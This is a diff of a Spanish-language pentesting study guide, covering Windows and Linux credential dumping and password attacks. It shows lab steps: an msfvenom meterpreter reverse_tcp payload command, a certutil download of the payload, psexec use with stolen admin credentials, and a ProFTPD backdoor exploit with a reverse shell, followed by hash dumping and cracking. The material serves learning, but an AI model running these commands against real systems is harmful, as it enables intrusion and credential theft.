@@ -6670,19 +6670,6 @@ En las operaciones de seguridad del mundo real, las bases de datos de vulnerabil
 
 
 
-<!----------------------------------------------------------------------------- ## Vulnerabilidades mas conocidas------------------------------------------------------------------------------------------------------------------>
-
-
-
-<h2> :arrow_right: Vulnerabilidades de alto impacto</h2> 
-
-
-
-
-
-
-
-
 
 
 
@@ -7796,296 +7783,7 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 </br>
 
 
-<!--------------------------------------------------##  Tipos de ataque de Contraseña --------------------------------------------------------------------------->
 
-</br>
-
-<h2> :arrow_right:  Volcado de credenciales de Windows </h2>
-
-
-<h2> :no_entry:  Hashes de contraseñas de Windows</h2>
-
-
-<p> Windows almacena los hashes de contraseña en estas ubicaciones</p>
-
-
-
-<p> :pushpin: Cuentas locales — SAM Database (Security Accounts Manager - Administrador de cuentas de seguridad) <p>
-
-<p> Es la base de datos de Windows que almacena las cuentas de usuario locales y sus credenciales (hashes de contraseñas).</p>
-
-<p> Ubicación física:<b>C:\Windows\System32\config\SAM</b><p>
-
-
-  <p><b>Contenido</b><p>
-    <p> • Nombres de usuario y RID (Relative ID, ej. Administrator = 500) </p>
-    <p> • Hashes de contraseñas (NTLM; LM si está habilitado en sistemas antiguos) </p>
-    <p> • Grupos locales, SID, políticas de contraseñas locales</p>
-    <p> • Historial de hashes de contraseñas anteriores</p>
-
-<p><b>Nota</b> El Kernek de Windows NT mantiene bloqueado el archivo de la base de datos SAM por lo tanto los atacantes suelen utilizar tecnicas y herramientas en memoria para extraer los hashes de SAM del proceso LSASS<p>
-
-<p><b> LSASS (Local Security Authority Subsystem Service)</b> Es el proceso de Windows responsable de aplicar la política de seguridad y manejar la autenticación. Se ejecuta como lsass.exe con privilegios SYSTEM.</p>
-
-<p>En las versiones modernas de Windows la base de datos SAM esta encriptada con una clave SYSKEY, </p>
-
-<p>Es importante tener en cuenta que para realizar un volcado de hashes de la memoria se requiere contar con privilegios elevados o administrativos para interactuar con el proceso LSASS </p>
-
-
-
-<p><b>:radio_button: LM Hash (LanMan / LAN Manager Hash)</b></p>
-
-<p>Es el formato de hash de contraseñas más antiguo de Windows, usado desde OS/2 y Windows NT 3.x para compatibilidad con redes LAN Manager. Obsoleto e inseguro. </p>
-
-<p>El protocolo se utiliza para hashear las contraseñas de los usuarios de la siguiente forma  </p>
-    <p> • La contraseña se divide en dos fragmentos de siete caracteres </p>
-    <p> • Todos los caractares se convierten en mayuscula </p>
-    <p> • Cada fragmento se hashea por separado con el algoritmo DES</p>
-
-<p>El HASH LM se considera un protocolo debil y se puede decifrar facilmente</p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/rswFX6jN/401.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p><b>:radio_button: NTLM (NTHash)</b></p>
-
-<p> NTLM es una coleccionde protocolos de autenticacion que se utilizan en Windows para facilitar la autenticacion entre ordenadores, este proceso implica el usi de un nombre de usuario y contraseña validos</p>
-<p> Desde Windows visa en adelante se deshabilito el hash LM y se utiliza NTLM </p>
-
-<p><b>Versiones NTLM</b></p>
-  <p> • <b>1. NTLMv1 (Versión 1)</b> Es la versión más antigua y la más insegura. Fue diseñada para mejorar la seguridad sobre el antiguo protocolo LM (LAN Manager), pero hoy en día se considera extremadamente vulnerable. </p>
-
-  <p> • <b>2. NTLMv2 (Versión 2)</b> Es la versión que la mayoría de los sistemas operativos Windows modernos utilizan por defecto cuando Kerberos no está disponible o no es la opción preferida. Es vulnerable a ataques de Relay (NTLM Relay Attacks), donde un atacante intercepta una autenticación y la "retransmite" a otro servicio para ganar acceso sin conocer la contraseña real.</p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/ZRZ5Hvys/400.png" alt="Descripción de la imagen">
-  
-</p>
-
-<p> :pushpin: (Active Directory) — NTDS.dit </p>
-<p> :pushpin: Memoria — LSASS </p>
-<p> :pushpin: Caché de logon de dominio (DCC2) </p>
-
-
-
-<h2> :no_entry: Contraseñas en archivos de configuración de Windows</h2>
-
-<h3> Instalacion desatendida de windows </h3>
-
-
-<p> La utilidad de instalacion desatendida de Windows normalmente utiliza uno de los siguientes archivos de configuracion que contiene informacion de configuracion del sistema y de la cuenta de usuario </p>
-
-
-<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
-
-
-<p>  Un atacante o un administrador de sistemas podría encontrar información sensible como: </p>
-
-<p> • <b> Configuraciones de Partición:</b> Detalles sobre cómo se dividió el disco duro.</p>
-<p> • <b> Configuración de la Cuenta de Usuario:</b> Nombres de usuario creados durante la instalación.</p>
-<p> • <b> Configuración de Red:</b> Parámetros de IP, nombres de dominio o perfiles de red.</p>
-<p> • <b> Drivers:</b> Listado de controladores instalados durante el proceso </p>
-<p> • <b> Configuraciones de Región y Teclado:</b> Localización del sistema.</p>
-
-
-
-<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
-
-<p> Al ser un archivo XML, contiene instrucciones que le dicen al instalador cómo debe configurarse el sistema sin intervención manual del usuario. Dependiendo de cómo se haya creado la imagen de instalación, podrías encontrar: </p>
-
-
-<p> • <b> Credenciales de Administrador:</b>  En configuraciones mal protegidas, se pueden encontrar contraseñas en texto plano para la cuenta de administrador local.</p>
-<p> • <b> Product Keys:</b> Claves de producto de Windows.</p>
-<p> • <b> Scripts de Post-instalación:</b> Comandos que se ejecutan automáticamente al terminar la instalación (útiles para configurar software o políticas de seguridad).</p>
-<p> • <b> Configuraciones de Seguridad:</b> Si se desactivaron ciertas características de seguridad durante el despliegue. </p>
-
-
-
-<p> Como medida de seguridad, las contraseñas almacenadas en el archivo de configuracion de la instalacion desatendida de Winwos pueden estar codificados en base64 </p>
-
-
-<p> Si un atacante logra acceso al sistema de archivos, la lectura de estos archivos XML puede revelar la arquitectura de la red, nombres de usuarios, métodos de autenticación y configuraciones críticas de la máquina. </p>
-
-
-<p> :radio_button: Pasos</p>
-
-
-<p> 1. Generar una carga util de interprete con MSF Venom </p>
-<p><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f exe >payload.exe</b></p>
-
-
-
-<p> 2. Configurar un servidor web simple para alojar el archivo payload.exe </p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/dVnYzS9d/402.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p> 3. En un escenario real se obtendra acceso al sistema objetivo a traves de un exploit o explotando una vulneravilidad en un servicio para esta demostracion se utilizara la utilidad <b> certutil -urlcache -f + direccion IP del servidor web/ el nombre del archivo y el nombre con el cual se va a guardar "" </b></p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/FF0wMBrx/403.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-
-
-<p> 4. Utilizar Metasploit </p>
-
-<p> Utilizar Multi-handler</p>
-<p> Configurar la carga util que se uso con anterioridad y los parametros adicionales</p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/cLZSrNHK/404.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p> 5. Ejecutar el archivo payload.exe que dejamos en el escritorio de Windows, para obtener la sesion de meterpreter </p>
-
-<p> La sesion de Meterpreter se encuentra abierta  </p>
-
-
-
-
-<p> 6. Buscar los archivos </p>
-
-<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
-<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/HxfGmqRW/405.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p> 7. Descargar los archivos para visualizar su contenido </p>
-<p> Al validar su contenido podemos observar que contiene informacion relacionada a las instalacion de Windows  </p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/T3k4f85Z/406.png" alt="Descripción de la imagen">
-  
-</p>
-
-<p> En el apartado de AutoLogon encontramos el usuario <b>administrador</b> junto con su contraseña la cual se encuentra codificada en base 64 </p>
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/bvwdSnJy/407.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p> 8. Una vez obtenida la credenciales del administrador probarlas con <b>psexec.py</b></p>
-
-
-<p> Es una herramienta de línea de comandos escrita en Python que permite la ejecución remota de comandos en sistemas Windows.
-
-Es la implementación (basada en el protocolo de comunicación de Windows) de la herramienta original PsExec de la suite Sysinternals de Microsoft. Utiliza el protocolo SMB (Server Message Block) para conectarse a una máquina Windows remota, subir un ejecutable temporal y ejecutarlo con los privilegios del usuario proporcionado.</p>
-
-
-
-<p align="center">
-
-  <img src="https://i.postimg.cc/fyG0xRPj/408.png" alt="Descripción de la imagen">
-  
-</p>
-
-
-<p> Obtenemos una sesion shell de comandos. Adicionalmente podemos usar el modulo de psexec de Metasploit para obtener una sesion de meterpreter </p>
-
-
-
-
-
-
-
-<h2> :arrow_right:  Ataques de contraseñas </h2>
-
-
-<p> Tipos de ataque </p>
-
-
-<p> :radio_button: <b> Ataques de Diccionario </b>  es una técnica de fuerza bruta que utiliza una lista predefinida de palabras (diccionario) para intentar adivinar contraseñas. Es más eficiente que la fuerza bruta tradicional porque se enfoca en combinaciones probables.  </p>
-<p> :radio_button: <b> Ataque de Fuerza bruta</b> Un ataque de fuerza bruta es una técnica que prueba todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Es más lento pero garantiza encontrar la contraseña si se prueba todo el espacio de búsqueda. </p>
-<p> :radio_button: <b> credential stuffing </b> es una técnica donde se reutilizan credenciales comprometidas (por ejemplo, de un data breach) en múltiples servicios para obtener acceso no autorizado. Se basa en la tendencia de usuarios a reutilizar contraseñas. </p>
-<p> :radio_button: <b> Password Spraying </b> es una técnica que prueba una sola contraseña contra múltiples cuentas, en lugar de intentar varias contraseñas en una sola cuenta. Es útil para evitar bloqueos de cuentas por demasiados intentos fallidos. </p>
-<p> :radio_button: <b> taques híbridos </b> combinan técnicas de fuerza bruta y diccionario para aumentar la eficacia de los ataques de contraseña. Se utilizan cuando las contraseñas siguen patrones comunes (ej: password123 o admin123). </p>
-
-
-<p> Listas de palabras mas usadas </p>
-
-<p> La elección de la lista de palabras debe depender de su conocimiento del objetivo </p>
-
-
-<p> :radio_button: <b> RockYou </b> lista de contraseñas violadas </p>
-<p> :radio_button: <b> SecLists </b> colección de múltiples listas de palabras para diferentes propósitos </p>
-<p> :radio_button: <b> CrackStation </b> proporciona listas de palabras optimizadas para descifrar contraseñas. </p>
-<p> :radio_button: <b> Breach compilations  </b> contienen miles de millones de contraseñas reales de diversas violaciones de datos </p>
-
-
-<h3> :arrow_right: Herramientas de ataque de contraseñas </h3>
-
-
-<p> :radio_button: <b> THC Hydra </b> es una herramienta de fuerza bruta multi-protocolo, usada para realizar ataques de fuerza bruta contra múltiples protocolos (FTP, POP3, IMAP, SMTP, SSH y todos los métodos relacionados con HTTP). </p>
-<p> :radio_button: <b> Medusa </b> es similar a Hydra pero con un diseño modular. Algunos lo encuentran más estable para ciertos protocolos.. </p>
-<p> :radio_button: <b> Ncrack</b> Ncrack es una herramienta de fuerza bruta multi-protocolo desarrollada por Nmap, diseñada para acelerar los ataques de fuerza bruta en entornos de red. </p>
-<p> :radio_button: <b> CrackMapExec (CME)/NetExec </b> es una herramienta de pentesting que permite realizar ataques de credenciales contra múltiples protocolos (SMB, LDAP, Kerberos, etc.) y sistemas Windows. </p>
-<p> :radio_button: <b> Burp Suite intruder </b> es una herramienta de pentesting que permite realizar ataques de fuerza bruta, diccionario y híbridos contra aplicaciones web.. </p>
-<p> :radio_button: <b> Hashcat</b> Es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.).. </p>
-<p> :radio_button: <b> John the Ripper  </b> es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.). </p>
-
-
-
-<p>Mitigación de ataques con contraseña
-La mitigación contra ataques de contraseñas depende del sistema de destino. Las defensas modernas incluyen:
-
-Las políticas de contraseñas imponen restricciones de complejidad mínima. Orientación moderna como NIST SP 800-63B (un EE. UU. El estándar gubernamental para las pautas de identidad digital) recomienda centrarse en la longitud de la contraseña en lugar de las reglas de complejidad, bloquear las contraseñas comprometidas conocidas y no requerir cambios regulares de contraseña a menos que haya evidencia de compromiso.
-
-El bloqueo de cuenta bloquea temporal o permanentemente una cuenta después de una cierta cantidad de intentos fallidos. Esto es eficaz contra la fuerza bruta, pero puede evitarse mediante la pulverización de contraseñas o abusarse de él para denegar el servicio.
-
-La limitación de velocidad y el bloqueo retrasan las respuestas a los intentos de inicio de sesión. Unos pocos segundos de retraso son tolerables para los usuarios legítimos, pero obstaculizan gravemente las herramientas automatizadas. Las implementaciones más sofisticadas utilizan un retroceso exponencial.
-
-CAPTCHA requiere resolver un desafío difícil para las máquinas. Los CAPTCHA modernos utilizan análisis de comportamiento y puntuación de riesgos en lugar de simplemente reconocimiento de imágenes.
-
-Autenticación multifactor (Ministerio de Relaciones Exteriores) requiere verificación adicional más allá de la contraseña, como un código de una aplicación de autenticación, SMS (aunque los SMS son menos seguros) o una clave de seguridad de hardware. MFA es una de las defensas más efectivas contra los ataques de contraseñas.
-
-La autenticación sin contraseña elimina las contraseñas por completo utilizando métodos como:
-
-Las claves de acceso (FIDO2/WebAuthn) utilizan claves criptográficas almacenadas en dispositivos, reemplazando las contraseñas con verificación biométrica o PIN.
-Enlaces mágicos enviados por correo electrónico.
-Claves de seguridad de hardware como YubiKeys.
-La detección de contraseñas violadas verifica las contraseñas con bases de datos de violaciones conocidas durante el registro y el inicio de sesión. Servicios como "Have I Been Pwned" proporcionan API para este propósito.
-
-El análisis del comportamiento detecta anomalías como intentos de inicio de sesión desde ubicaciones inusuales, escenarios de viaje imposibles o patrones consistentes con ataques automatizados.
-
-Controles basados en IP que incluyen geofencing y bloqueo de dispositivos maliciosos conocidos IP, y requerir verificación adicional para nuevos dispositivos o ubicaciones.
-
-El uso de una combinación de los enfoques anteriores proporciona una defensa profunda contra ataques de contraseñas. Para entornos de alta seguridad, avanzar hacia la autenticación sin contraseña elimina por completo muchos de estos vectores de ataque.</p>
-
-
-</br>
 
 <!--------------------------------------------------##  Explotacion LINUX  --------------------------------------------------------------------------->
 
@@ -9923,6 +9621,228 @@ Se ejecutan automáticamente a intervalos o tiempos específicos (segundos, minu
 <p> Usar el sistema comprometido como punto de partida para acceder a otros recursos de la red. Esto implica el uso de credenciales robadas, explotación de vulnerabilidades en el sistema operativo, o el uso de herramientas de administración legítimas (como PsExec o WMI) para ejecutar comandos en otros hosts. </p>
 
 
+<h2> :arrow_right:  Credential Acces </h2>
+
+
+</br>
+
+<!--------------------------------------------------##  Volcado de credenciales de Windows --------------------------------------------------------------------------->
+
+</br>
+
+
+<h2> :no_entry:  Volcado de credenciales de Windows </h2>
+
+
+<p> Windows almacena los hashes de contraseña en estas ubicaciones</p>
+
+
+
+<p> :pushpin: Cuentas locales — SAM Database (Security Accounts Manager - Administrador de cuentas de seguridad) <p>
+
+<p> Es la base de datos de Windows que almacena las cuentas de usuario locales y sus credenciales (hashes de contraseñas).</p>
+
+<p> Ubicación física:<b>C:\Windows\System32\config\SAM</b><p>
+
+
+  <p><b>Contenido</b><p>
+    <p> • Nombres de usuario y RID (Relative ID, ej. Administrator = 500) </p>
+    <p> • Hashes de contraseñas (NTLM; LM si está habilitado en sistemas antiguos) </p>
+    <p> • Grupos locales, SID, políticas de contraseñas locales</p>
+    <p> • Historial de hashes de contraseñas anteriores</p>
+
+<p><b>Nota</b> El Kernek de Windows NT mantiene bloqueado el archivo de la base de datos SAM por lo tanto los atacantes suelen utilizar tecnicas y herramientas en memoria para extraer los hashes de SAM del proceso LSASS<p>
+
+<p><b> LSASS (Local Security Authority Subsystem Service)</b> Es el proceso de Windows responsable de aplicar la política de seguridad y manejar la autenticación. Se ejecuta como lsass.exe con privilegios SYSTEM.</p>
+
+<p>En las versiones modernas de Windows la base de datos SAM esta encriptada con una clave SYSKEY, </p>
+
+<p>Es importante tener en cuenta que para realizar un volcado de hashes de la memoria se requiere contar con privilegios elevados o administrativos para interactuar con el proceso LSASS </p>
+
+
+
+<p><b>:radio_button: LM Hash (LanMan / LAN Manager Hash)</b></p>
+
+<p>Es el formato de hash de contraseñas más antiguo de Windows, usado desde OS/2 y Windows NT 3.x para compatibilidad con redes LAN Manager. Obsoleto e inseguro. </p>
+
+<p>El protocolo se utiliza para hashear las contraseñas de los usuarios de la siguiente forma  </p>
+    <p> • La contraseña se divide en dos fragmentos de siete caracteres </p>
+    <p> • Todos los caractares se convierten en mayuscula </p>
+    <p> • Cada fragmento se hashea por separado con el algoritmo DES</p>
+
+<p>El HASH LM se considera un protocolo debil y se puede decifrar facilmente</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/rswFX6jN/401.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p><b>:radio_button: NTLM (NTHash)</b></p>
+
+<p> NTLM es una coleccionde protocolos de autenticacion que se utilizan en Windows para facilitar la autenticacion entre ordenadores, este proceso implica el usi de un nombre de usuario y contraseña validos</p>
+<p> Desde Windows visa en adelante se deshabilito el hash LM y se utiliza NTLM </p>
+
+<p><b>Versiones NTLM</b></p>
+  <p> • <b>1. NTLMv1 (Versión 1)</b> Es la versión más antigua y la más insegura. Fue diseñada para mejorar la seguridad sobre el antiguo protocolo LM (LAN Manager), pero hoy en día se considera extremadamente vulnerable. </p>
+
+  <p> • <b>2. NTLMv2 (Versión 2)</b> Es la versión que la mayoría de los sistemas operativos Windows modernos utilizan por defecto cuando Kerberos no está disponible o no es la opción preferida. Es vulnerable a ataques de Relay (NTLM Relay Attacks), donde un atacante intercepta una autenticación y la "retransmite" a otro servicio para ganar acceso sin conocer la contraseña real.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZRZ5Hvys/400.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> :pushpin: (Active Directory) — NTDS.dit </p>
+<p> :pushpin: Memoria — LSASS </p>
+<p> :pushpin: Caché de logon de dominio (DCC2) </p>
+
+
+
+<h2> :no_entry: Contraseñas en archivos de configuración de Windows</h2>
+
+<h3> Instalacion desatendida de windows </h3>
+
+
+<p> La utilidad de instalacion desatendida de Windows normalmente utiliza uno de los siguientes archivos de configuracion que contiene informacion de configuracion del sistema y de la cuenta de usuario </p>
+
+
+<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
+
+
+<p>  Un atacante o un administrador de sistemas podría encontrar información sensible como: </p>
+
+<p> • <b> Configuraciones de Partición:</b> Detalles sobre cómo se dividió el disco duro.</p>
+<p> • <b> Configuración de la Cuenta de Usuario:</b> Nombres de usuario creados durante la instalación.</p>
+<p> • <b> Configuración de Red:</b> Parámetros de IP, nombres de dominio o perfiles de red.</p>
+<p> • <b> Drivers:</b> Listado de controladores instalados durante el proceso </p>
+<p> • <b> Configuraciones de Región y Teclado:</b> Localización del sistema.</p>
+
+
+
+<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
+
+<p> Al ser un archivo XML, contiene instrucciones que le dicen al instalador cómo debe configurarse el sistema sin intervención manual del usuario. Dependiendo de cómo se haya creado la imagen de instalación, podrías encontrar: </p>
+
+
+<p> • <b> Credenciales de Administrador:</b>  En configuraciones mal protegidas, se pueden encontrar contraseñas en texto plano para la cuenta de administrador local.</p>
+<p> • <b> Product Keys:</b> Claves de producto de Windows.</p>
+<p> • <b> Scripts de Post-instalación:</b> Comandos que se ejecutan automáticamente al terminar la instalación (útiles para configurar software o políticas de seguridad).</p>
+<p> • <b> Configuraciones de Seguridad:</b> Si se desactivaron ciertas características de seguridad durante el despliegue. </p>
+
+
+
+<p> Como medida de seguridad, las contraseñas almacenadas en el archivo de configuracion de la instalacion desatendida de Winwos pueden estar codificados en base64 </p>
+
+
+<p> Si un atacante logra acceso al sistema de archivos, la lectura de estos archivos XML puede revelar la arquitectura de la red, nombres de usuarios, métodos de autenticación y configuraciones críticas de la máquina. </p>
+
+
+<p> :radio_button: Pasos</p>
+
+
+<p> 1. Generar una carga util de interprete con MSF Venom </p>
+<p><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f exe >payload.exe</b></p>
+
+
+
+<p> 2. Configurar un servidor web simple para alojar el archivo payload.exe </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/dVnYzS9d/402.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 3. En un escenario real se obtendra acceso al sistema objetivo a traves de un exploit o explotando una vulneravilidad en un servicio para esta demostracion se utilizara la utilidad <b> certutil -urlcache -f + direccion IP del servidor web/ el nombre del archivo y el nombre con el cual se va a guardar "" </b></p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/FF0wMBrx/403.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<p> 4. Utilizar Metasploit </p>
+
+<p> Utilizar Multi-handler</p>
+<p> Configurar la carga util que se uso con anterioridad y los parametros adicionales</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cLZSrNHK/404.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 5. Ejecutar el archivo payload.exe que dejamos en el escritorio de Windows, para obtener la sesion de meterpreter </p>
+
+<p> La sesion de Meterpreter se encuentra abierta  </p>
+
+
+
+
+<p> 6. Buscar los archivos </p>
+
+<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
+<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HxfGmqRW/405.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 7. Descargar los archivos para visualizar su contenido </p>
+<p> Al validar su contenido podemos observar que contiene informacion relacionada a las instalacion de Windows  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/T3k4f85Z/406.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> En el apartado de AutoLogon encontramos el usuario <b>administrador</b> junto con su contraseña la cual se encuentra codificada en base 64 </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bvwdSnJy/407.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 8. Una vez obtenida la credenciales del administrador probarlas con <b>psexec.py</b></p>
+
+
+<p> Es una herramienta de línea de comandos escrita en Python que permite la ejecución remota de comandos en sistemas Windows.
+
+Es la implementación (basada en el protocolo de comunicación de Windows) de la herramienta original PsExec de la suite Sysinternals de Microsoft. Utiliza el protocolo SMB (Server Message Block) para conectarse a una máquina Windows remota, subir un ejecutable temporal y ejecutarlo con los privilegios del usuario proporcionado.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fyG0xRPj/408.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Obtenemos una sesion shell de comandos. Adicionalmente podemos usar el modulo de psexec de Metasploit para obtener una sesion de meterpreter </p>
+
 
 <!--------------------------------------------------##  Dumping Hashes With Mimikatz --------------------------------------------------------------------------->
 
@@ -10191,6 +10111,226 @@ Se ejecutan automáticamente a intervalos o tiempos específicos (segundos, minu
   <p> :radio_button: <b> Privilegios de Servicio:</b> Una vez que el servicio se ejecuta, generalmente lo hace con los privilegios del usuario autenticado o, en muchos casos, logra escalar a NT AUTHORITY\SYSTEM, lo que te otorga control total sobre el sistema operativo.</p>
 
 <p> :pushpin: <b> Persistencia y Estabilidad</b> </p>
+
+
+
+
+
+
+<!--------------------------------------------------##  Volcado de credenciales de Linux --------------------------------------------------------------------------->
+
+</br>
+
+
+<h2> :no_entry:  Volcado de credenciales de Linux </h2>
+
+
+</br>
+
+
+<p> El archivo /etc/passwd es el archivo principal de cuentas en la mayoría de los sistemas Linux modernos (y Unix). </p>
+
+<p><b> /etc/passwd</b>  es legible por todos los usuarios (world-readable). </p>
+<p><b> /etc/shadow</b>  es legible solo por root (y a veces por grupos específicos como shadow </p>
+
+
+<p> El archivo passwd y shadow proporciona informacion sobre el algoritmo de hash que se esta utilzando el cual se puede determinar observando el numero que aparece despues del nombre de ususario con el simbolo del dolar ($) </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/j2dJ5W5L/481.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 1. Identificacion de servicios </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/gk2TG0qy/482.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Podemos observar que tenemos un servidor FTP en su version ProFTPD 1.3.3c</p>
+
+
+<p> 2. Validar exploit disponibles </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/c1XFcwfM/483.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 3. Buscar un modulo de Metasploit que permita explotar este servicio</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/C5LmMvDM/484.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> 4. utilizar el modulo <b>unix/ftp/proftpd_133c_backdoor</b> Este módulo aprovecha una puerta trasera maliciosa que se añadió al archivo de descarga de ProFTPD.</p>
+
+<p> Configurar los parametros necesarios para su funcionamiento: Direccion IP de la victima y del atacante. Adicionalmente se requiere agregar el payload para este caso usaremos <b>payload/cmd/unix/reverse</b></p>
+
+
+<p> Utilizar el parametro <b>/bin/bash -i</b> para iniciar una shell interactiva con privilegios elevados</p>
+
+
+
+<p> La cuenta root es el unico usuario del sistema el resto son cuentas de servicio </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/KYPNPXD0/485.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> El hash comienza con $6$ Por lo tanto, la contraseña de root está almacenada mediante SHA-512.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Gmg0StVS/487.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Colocar la sesion en segundo plano </p>
+<p> Enumerar las sesiones </p>
+<p> Actulizar la sesion a una de Meterpreter con el parametro <b>sessions -u</b> y colocar el identificador de la sesion</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/NGz1rfwv/486.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> Una vez comprobada la sesion de meterpreter (opcional) colocarla en segundo plano para proceder con el volcado de Hash</p>
+
+<p> Utilizar el modulo <b>post/linux/gather/hashdump</b>Módulo Post para extraer los hash de las contraseñas de todos los usuarios de un sistema Linux</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/W1PqMdWC/488.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Hemos explotado el servidor FTP de destino. Usaremos un módulo posterior a la explotación para volcar los hashes de los usuarios del sistema.</p>
+
+
+<p> Utilizar el modulo <b>auxiliary/analyze/crack_linux</b>Este módulo utiliza John the Ripper o Hashcat para identificar contraseñas débiles que se han obtenido de archivos «passwd» sin enmascarar de sistemas Unix/Linux.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/43WKkBfk/489.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Logramos obtener la contraseña en texto plano </p>
+
+
+
+
+
+
+
+<!--------------------------------------------------##  contraseñas --------------------------------------------------------------------------->
+
+
+
+
+
+
+<h2> :arrow_right:  Ataques de contraseñas </h2>
+
+
+<p> Tipos de ataque </p>
+
+
+<p> :radio_button: <b> Ataques de Diccionario </b>  es una técnica de fuerza bruta que utiliza una lista predefinida de palabras (diccionario) para intentar adivinar contraseñas. Es más eficiente que la fuerza bruta tradicional porque se enfoca en combinaciones probables.  </p>
+<p> :radio_button: <b> Ataque de Fuerza bruta</b> Un ataque de fuerza bruta es una técnica que prueba todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Es más lento pero garantiza encontrar la contraseña si se prueba todo el espacio de búsqueda. </p>
+<p> :radio_button: <b> credential stuffing </b> es una técnica donde se reutilizan credenciales comprometidas (por ejemplo, de un data breach) en múltiples servicios para obtener acceso no autorizado. Se basa en la tendencia de usuarios a reutilizar contraseñas. </p>
+<p> :radio_button: <b> Password Spraying </b> es una técnica que prueba una sola contraseña contra múltiples cuentas, en lugar de intentar varias contraseñas en una sola cuenta. Es útil para evitar bloqueos de cuentas por demasiados intentos fallidos. </p>
+<p> :radio_button: <b> taques híbridos </b> combinan técnicas de fuerza bruta y diccionario para aumentar la eficacia de los ataques de contraseña. Se utilizan cuando las contraseñas siguen patrones comunes (ej: password123 o admin123). </p>
+
+
+<p> Listas de palabras mas usadas </p>
+
+<p> La elección de la lista de palabras debe depender de su conocimiento del objetivo </p>
+
+
+<p> :radio_button: <b> RockYou </b> lista de contraseñas violadas </p>
+<p> :radio_button: <b> SecLists </b> colección de múltiples listas de palabras para diferentes propósitos </p>
+<p> :radio_button: <b> CrackStation </b> proporciona listas de palabras optimizadas para descifrar contraseñas. </p>
+<p> :radio_button: <b> Breach compilations  </b> contienen miles de millones de contraseñas reales de diversas violaciones de datos </p>
+
+
+<h3> :arrow_right: Herramientas de ataque de contraseñas </h3>
+
+
+<p> :radio_button: <b> THC Hydra </b> es una herramienta de fuerza bruta multi-protocolo, usada para realizar ataques de fuerza bruta contra múltiples protocolos (FTP, POP3, IMAP, SMTP, SSH y todos los métodos relacionados con HTTP). </p>
+<p> :radio_button: <b> Medusa </b> es similar a Hydra pero con un diseño modular. Algunos lo encuentran más estable para ciertos protocolos.. </p>
+<p> :radio_button: <b> Ncrack</b> Ncrack es una herramienta de fuerza bruta multi-protocolo desarrollada por Nmap, diseñada para acelerar los ataques de fuerza bruta en entornos de red. </p>
